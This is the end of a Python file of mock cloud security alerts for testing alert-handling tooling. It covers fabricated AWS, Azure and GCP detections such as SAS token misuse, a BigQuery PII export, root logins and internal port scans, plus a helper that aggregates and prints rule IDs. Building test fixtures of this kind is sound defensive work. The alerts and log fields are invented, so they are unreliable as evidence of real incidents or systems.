        "rule_name": "SAS token misuse",
        "alert_date": "2025-09-24T01:10:30Z",
        "tags": ["storage", "sas-token", "misuse"],
        "severity": "High",
        "reference": "SAS token used from anomalous IP",
        "description": "A SAS (Shared Access Signature) token was used from an anomalous IP not associated with expected application/location—token may be compromised.",
        "artifact": [
            {"type": "account_name", "value": "mycorp-data-storage"},
            {"type": "sas_token_id", "value": "sp=r&st=..."},
            {"type": "source_ip", "value": "203.0.113.50"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Storage Log",
            "timestamp": "2025-09-24T01:10:29.999Z",
            "api_operation": "GetBlob",
            "authentication_method": "SAS",
            "client_ip": "203.0.113.50"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "BigQuery",
        "rule_id": "CLOUD-GCP-BQ-27-BigQuery-Large-Data-Export",
        "rule_name": "BigQuery large-scale data export",
        "alert_date": "2025-09-24T01:15:15Z",
        "tags": ["database", "data-exfiltration", "large-export"],
        "severity": "High",
        "reference": "BigQuery table exported to external storage",
        "description": "BigQuery user 'data-analyst' exported sensitive table with millions of records to external bucket—potential data leak.",
        "artifact": [
            {"type": "user_identity", "value": "data-analyst@mycorp.com"},
            {"type": "table_name", "value": "customer-pii-table"},
            {"type": "destination", "value": "external-bucket"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "BigQuery Audit Log",
            "timestamp": "2025-09-24T01:15:14.543Z",
            "methodName": "google.cloud.bigquery.v2.JobService.InsertJob",
            "job_type": "EXTRACT",
            "destination_uri": "gs://external-bucket/export_*.csv"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-28-Unusual-AssumeRole",
        "rule_name": "Anomalous AssumeRole",
        "alert_date": "2025-09-24T01:20:00Z",
        "tags": ["iam", "privilege-escalation", "access-anomaly"],
        "severity": "Medium",
        "reference": "User 'dev-user' assumed 'prod-admin-role'",
        "description": "IAM user 'dev-user' assumed 'prod-admin-role' outside normal job scope—possible privilege misuse.",
        "artifact": [
            {"type": "user_identity", "value": "dev-user"},
            {"type": "assumed_role", "value": "prod-admin-role"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T01:19:59.000Z",
            "event_name": "AssumeRole",
            "userIdentity": {"userName": "dev-user"},
            "requestParameters": {"roleArn": "arn:aws:iam::123456789012:role/prod-admin-role"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Virtual Network",
        "rule_id": "CLOUD-AZ-NET-29-Peer-Network-Connection",
        "rule_name": "Virtual network peering connection",
        "alert_date": "2025-09-24T01:25:30Z",
        "tags": ["networking", "lateral-movement", "policy-violation"],
        "severity": "Medium",
        "reference": "Azure virtual network created new peering connection",
        "description": "Azure virtual network 'prod-vnet' established new peering to unknown VNet—potential new lateral movement path.",
        "artifact": [
            {"type": "vnet_name", "value": "prod-vnet"},
            {"type": "peered_vnet", "value": "unknown-vnet"},
            {"type": "user_identity", "value": "api-automation"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Activity Log",
            "timestamp": "2025-09-24T01:25:29.876Z",
            "eventName": "Create or Update Virtual Network Peering",
            "caller": "api-automation@mycorp.com"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "Compute Engine",
        "rule_id": "CLOUD-GCP-COMPUTE-30-New-VM-with-External-IP",
        "rule_name": "New VM created with external IP",
        "alert_date": "2025-09-24T01:30:00Z",
        "tags": ["compute", "misconfiguration", "exposed-service"],
        "severity": "Low",
        "reference": "New VM instance assigned external IP",
        "description": "GCP Compute Engine instance 'prod-db-proxy' created and assigned external IP—violates internal no external IP policy.",
        "artifact": [
            {"type": "vm_name", "value": "prod-db-proxy"},
            {"type": "external_ip", "value": "34.123.45.67"},
            {"type": "user_identity", "value": "ops-user"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-24T01:29:59.000Z",
            "methodName": "compute.instances.insert",
            "requestJson": {"networkInterfaces": [{"accessConfigs": [{"name": "external-nat"}]}]}
        }
    }
]
cloud_alert.extend([
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-01-Root-User-Activity",
        "rule_name": "Root account activity",
        "alert_date": "2025-09-23T23:05:00Z",
        "tags": ["iam", "privileged-account", "security-best-practice"],
        "severity": "High",
        "reference": "AWS Root account login occurred",
        "description": "AWS Root account logged in from non-designated device—per security best practices root should remain locked and used only for emergencies.",
        "artifact": [
            {"type": "account_id", "value": "123456789012"},
            {"type": "user_identity", "value": "Root"},
            {"type": "event_name", "value": "ConsoleLogin"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:04:59.888Z",
            "event_name": "ConsoleLogin",
            "userIdentity": {"type": "Root"},
            "sourceIPAddress": "203.0.113.10",
            "user_agent": "Mozilla/5.0"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Compute",
        "rule_id": "CLOUD-AZ-COMPUTE-02-VM-Reconnaissance",
        "rule_name": "VM internal reconnaissance",
        "alert_date": "2025-09-23T23:10:30Z",
        "tags": ["compute", "reconnaissance", "lateral-movement"],
        "severity": "Medium",
        "reference": "Azure VM performed internal network scan",
        "description": "Azure VM 'prod-web-01' suddenly began large-scale port scan across internal virtual network resources—possible compromise.",
        "artifact": [
            {"type": "vm_name", "value": "prod-web-01"},
            {"type": "vm_ip", "value": "10.0.0.4"},
            {"type": "scan_type", "value": "TCP Port Scan"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Network Watcher",
            "timestamp": "2025-09-23T23:10:29.987Z",
            "event_type": "NetworkSecurityGroupFlowEvent",
            "properties": {"src_ip": "10.0.0.4", "dest_ip": "10.0.0.0/24", "dest_port_range": "*", "protocol": "TCP"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "Storage",
        "rule_id": "CLOUD-GCP-STORAGE-03-Public-Bucket-Access",
        "rule_name": "Publicly accessible bucket",
        "alert_date": "2025-09-23T23:15:20Z",
        "tags": ["storage", "misconfiguration", "data-leak"],
        "severity": "High",
        "reference": "GCP storage bucket configured as publicly accessible",
        "description": "GCP Cloud Storage bucket 'mycorp-customer-data' permissions changed to public access—may expose sensitive data.",
        "artifact": [
            {"type": "bucket_name", "value": "mycorp-customer-data"},
            {"type": "permission_change", "value": "publicAccess: True"},
            {"type": "user_identity", "value": "api-service-account"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-23T23:15:19.444Z",
            "methodName": "storage.buckets.setIamPolicy",
            "principalEmail": "api-service-account@mycorp.iam.gserviceaccount.com",
            "resource": {"type": "storage_bucket", "name": "mycorp-customer-data"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-01-Root-User-Activity",
        "rule_name": "Root account activity",
        "alert_date": "2025-09-24T08:30:00Z",
        "tags": ["iam", "privileged-account", "security-best-practice"],
        "severity": "High",
        "reference": "AWS Root account login from new IP address",
        "description": "AWS Root account logged in from previously unseen IP address—root should remain locked and only used in emergencies per best practices.",
        "artifact": [
            {"type": "account_id", "value": "123456789012"},
            {"type": "user_identity", "value": "Root"},
            {"type": "event_name", "value": "ConsoleLogin"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T08:29:59.123Z",
            "event_name": "ConsoleLogin",
            "userIdentity": {"type": "Root"},
            "sourceIPAddress": "1.2.3.4",
            "user_agent": "Mozilla/5.0"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Compute",
        "rule_id": "CLOUD-AZ-COMPUTE-02-VM-Reconnaissance",
        "rule_name": "VM internal reconnaissance",
        "alert_date": "2025-09-24T09:15:45Z",
        "tags": ["compute", "reconnaissance", "lateral-movement"],
        "severity": "Medium",
        "reference": "Azure VM performed internal network port scan",
        "description": "Azure VM 'dev-app-02' suddenly initiated large-scale port scanning of other VMs in the internal virtual network—possible compromise of the VM.",
        "artifact": [
            {"type": "vm_name", "value": "dev-app-02"},
            {"type": "vm_ip", "value": "10.0.1.5"},
            {"type": "scan_type", "value": "UDP Port Scan"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Network Watcher",
            "timestamp": "2025-09-24T09:15:44.765Z",
            "event_type": "NetworkSecurityGroupFlowEvent",
            "properties": {"src_ip": "10.0.1.5", "dest_ip": "10.0.1.0/24", "dest_port_range": "*", "protocol": "UDP"}
        }
    }
])


def get_mock_alerts() -> list:
    mock_alerts = []
    # Aggregate all defined mock alert lists across domains
    all_alert_groups = (
        edr_alerts,
        ndr_alert,
        dlp_alert,
        mail_alert,
        ot_alert,
        proxy_alert,
        ueba_alert,
        ti_alert,
        iam_alert,
        cloud_alert,
    )

    for alert_group in all_alert_groups:
        if isinstance(alert_group, list):
            mock_alerts.extend(alert_group)

    return mock_alerts


if __name__ == "__main__":
    rule_list = []
    alerts = get_mock_alerts()
    for alert in alerts:
        if alert.get("rule_id") not in rule_list:
            rule_list.append(alert.get("rule_id"))
            print(alert.get("rule_id"))
            print(alert.get("rule_name"))
            print("----------------")
